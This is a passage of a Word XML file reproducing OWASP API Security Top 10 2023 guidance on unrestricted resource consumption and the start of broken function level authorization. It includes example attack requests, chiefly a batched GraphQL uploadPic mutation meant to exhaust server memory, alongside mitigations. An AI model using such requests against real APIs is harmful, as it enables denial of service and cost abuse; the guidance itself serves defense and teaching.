              <w:t xml:space="preserve"> via high loads of traffic, impacting APIs’ service rate.</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It's common to find APIs that do not limit client interactions or resource consumption. Crafted API requests, such as those including parameters that control the number of resources to be returned and performing response status/time/length analysis should allow identification of the issue. The same is valid for batched operations. Although threat agents don't have visibility over costs impact, this can be inferred based on service providers’ (e.g. cloud provider) business/pricing model.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:tcMar>
              <w:top w:w="225" w:type="dxa"/>
              <w:left w:w="300" w:type="dxa"/>
              <w:bottom w:w="225" w:type="dxa"/>
              <w:right w:w="300" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00933883" w:rsidRPr="00790A44" w:rsidRDefault="00933883"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Exploitation can lead to </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>DoS</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> due to resource starvation, but it can also lead to operational costs increase such as those related to the infrastructure due to higher CPU demand, increasing cloud storage needs, etc.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00933883" w:rsidRPr="00790A44" w:rsidRDefault="00933883"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Satisfying API requests requires resources such as network bandwidth, CPU, memory, and storage. Sometimes required resources are made available by service providers via API integrations, and paid for per request, such as sending emails/SMS/phone calls, biometrics validation, etc.</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is vulnerable if at least one of the following limits is missing or set inappropriately (e.g. too low/high):</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Execution timeouts</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Maximum </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>allocable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> memory</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Maximum number of file descriptors</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Maximum number of processes</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Maximum upload file size</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Number of operations to perform in a single API client request (e.g. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>GraphQL</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> batching)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00933883" w:rsidRPr="00790A44" w:rsidRDefault="00933883" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Number of records per page to return in a single request-response</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00933883" w:rsidRPr="00790A44" w:rsidRDefault="00933883" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>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Third-party service providers' spending limit</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00933883" w:rsidRPr="00790A44" w:rsidRDefault="00933883"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933883" w:rsidRPr="00790A44" w:rsidRDefault="00933883"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 social network implemented a “forgot password” flow using SMS verification, enabling the user to receive a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>one time</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve"> token via SMS in order to reset their password.</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Once a user clicks on "forgot password" an API call is sent from the user's browser to the back-end API:</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initiate_forgot_password</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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step</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>": 1,</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user_number</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>": "6501113434"</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Then, behind the scenes, an API call is sent from the back-end to a 3rd party API that takes care of the SMS delivering:</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sms</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>send_reset_pass_code</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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Host: willyo.net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lastRenderedPageBreak/>
        <w:t xml:space="preserve">  "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>phone_number</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>": "6501113434"</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The 3rd party provider, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>Willyo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>, charges $0.05 per this type of call.</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An attacker writes a script that sends the first API call tens of thousands of times. The back-end follows and requests </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>Willyo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve"> to send tens of thousands of text messages, leading the company to lose thousands of dollars in a matter of minutes.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00933883" w:rsidRPr="00790A44" w:rsidRDefault="00933883"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 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>GraphQL</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve"> API Endpoint allows the user to upload a profile picture.</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graphql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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query</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>": "mutation {</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uploadPic</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name: \"pic1\", base64_pic: \"R0FOIEFOR0xJVA…\") {</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url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>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Once the upload is complete, the API generates multiple thumbnails with different sizes based on the uploaded picture. This graphical operation takes a lot of memory from the server.</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The API implements a traditional rate limiting protection - a user can't access the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>GraphQL</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve"> endpoint too many times in a short period of time. The API also checks for the uploaded picture's size before generating thumbnails to avoid processing pictures that are too large.</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An attacker can easily bypass those mechanisms, by leveraging the flexible nature of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>GraphQL</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>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graphql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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{"query": "mutation {</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>uploadPic</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name: \"pic1\", base64_pic: \"R0FOIEFOR0xJVA…\") {</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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{"query": "mutation {</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>uploadPic</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name: \"pic2\", base64_pic: \"R0FOIEFOR0xJVA…\") {</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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{"query": "mutation {</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>uploadPic</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name: \"pic999\", base64_pic: \"R0FOIEFOR0xJVA…\") {</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>}}"},</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00933883" w:rsidRPr="00790A44" w:rsidRDefault="00933883"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Because the API does not limit the number of times the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>uploadPic</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t> operation can be attempted, the call will lead to exhaustion of server memory and Denial of Service.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00933883" w:rsidRPr="00790A44" w:rsidRDefault="00933883"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lastRenderedPageBreak/>
        <w:t>Scenario #3</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service provider allows clients to download arbitrarily large files using its API. These files are stored in cloud object storage and they don't change that often. The service provider relies on a cache service to have a better service rate and to keep bandwidth consumption low. The cache service only caches files up to 15GB.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00933883" w:rsidRPr="00790A44" w:rsidRDefault="00933883"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When one of the files gets updated, its size increases to 18GB. All service clients immediately start pulling the new version. Because there were no consumption cost alerts, nor a maximum cost allowance for the cloud service, the next monthly bill increases from US$13, on average, to US$8k.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00933883" w:rsidRPr="00790A44" w:rsidRDefault="00933883"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 a solution that makes it easy to limit </w:t>
      </w:r>
      <w:hyperlink r:id="rId25" w:anchor="memory" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>memory</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId26" w:anchor="cpu" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>CPU</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId27" w:anchor="restart" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>number of restarts</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId28" w:anchor="ulimit" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>file descriptors, and processes</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> such as Containers / </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Serverless</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> code (e.g. Lambdas).</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Define and enforce a maximum size of data on all incoming parameters and payloads, such as maximum length for strings, maximum number of elements in arrays, and maximum upload file size (regardless of whether it is stored locally or in cloud storage).</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Implement a limit on how often a client can interact with the API within a defined timeframe (rate limiting).</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Rate limiting should be </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>fine tuned</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> based on the business needs. Some API Endpoints might require stricter policies.</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Limit/throttle how many times or how often a single API client/user can execute a single operation (e.g. validate an OTP, or request password recovery without visiting the one-time URL).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00933883" w:rsidRPr="00790A44" w:rsidRDefault="00933883" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>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Add proper server-side validation for query string and request body parameters, specifically the one that controls the number of records to be returned in the response.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00933883" w:rsidRPr="00790A44" w:rsidRDefault="00933883" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>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Configure spending limits for all service providers/API integrations. When setting spending limits is not possible, billing alerts should be configured instead.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0080304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DF5E36" w:rsidRPr="00790A44" w:rsidRDefault="00DF5E36"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API5:2023 Broken Function Level Authorization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703"/>
        <w:gridCol w:w="4650"/>
        <w:gridCol w:w="3767"/>
      </w:tblGrid>
      <w:tr w:rsidR="00DF5E36" w:rsidRPr="00790A44" w:rsidTr="00DF5E36">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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DF5E36" w:rsidRPr="00790A44" w:rsidTr="00DF5E36">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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Common</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Severe</w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t> : Business Specific</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DF5E36" w:rsidRPr="00790A44" w:rsidTr="00DF5E36">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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Exploitation requires the attacker to send legitimate API calls to an API endpoint that they should not have access to as anonymous users or regular, non-privileged users. Exposed endpoints will be easily exploited.</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t>Authorization checks for a function or resource are usually managed via configuration or code level. Implementing proper checks can be a confusing task since modern applications can contain many types of roles, groups, and complex user hierarchies (e.g. sub-users, or users with more than one role). It's easier to discover these flaws in APIs since APIs are more structured, and accessing different functions is more predictable.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:tcMar>
              <w:top w:w="225" w:type="dxa"/>
              <w:left w:w="300" w:type="dxa"/>
              <w:bottom w:w="225" w:type="dxa"/>
              <w:right w:w="300" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00DF5E36" w:rsidRPr="00790A44" w:rsidRDefault="00DF5E36" w:rsidP="00AD3BE1">
            <w:pPr>
              <w:jc w:val="lowKashida"/>
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Such flaws allow attackers to access unauthorized functionality. Administrative functions are key targets for this type of attack and may lead to data disclosure, data loss, or data corruption. Ultimately, it may lead to service disruption.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00DF5E36" w:rsidRPr="00790A44" w:rsidRDefault="00DF5E3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Is the API Vulnerable?</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best way to find broken function level authorization issues is to perform a deep analysis of the authorization mechanism while keeping in mind the user hierarchy, different roles or groups in the application, and asking the following questions:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DF5E36" w:rsidRPr="00790A44" w:rsidRDefault="00DF5E36" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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Can a regular user access administrative endpoints?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DF5E36" w:rsidRPr="00790A44" w:rsidRDefault="00DF5E36" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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Can a user perform sensitive actions (e.g. creation, modification, or </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>deletion )</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> that they should not have access to by simply changing the HTTP method (e.g. from </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> to </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DELETE</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DF5E36" w:rsidRPr="00790A44" w:rsidRDefault="00DF5E36" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>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Can a user from group X access a function that should be exposed only to users from group Y, by simply guessing the endpoint URL and parameters (e.g. </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/</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/v1/users/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>export_all</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
